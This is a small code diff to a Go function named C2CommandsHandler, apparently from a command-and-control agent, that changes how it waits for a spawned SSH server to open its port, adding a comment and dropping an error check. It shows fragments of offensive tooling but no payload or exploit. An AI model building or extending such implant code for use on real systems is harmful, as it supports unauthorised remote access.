@@ -104,12 +104,9 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			errChan <- SSHD(*shell, *port, *args)
 		}()
 
+		// wait for SSHD to start
 		for !tun.IsPortOpen("127.0.0.1", *port) {
 			time.Sleep(100 * time.Millisecond)
-			if err != nil {
-				out = fmt.Sprintf("Error: sshd failed to start: %v\n%s", err, out)
-				break
-			}
 		}
 
 		select {
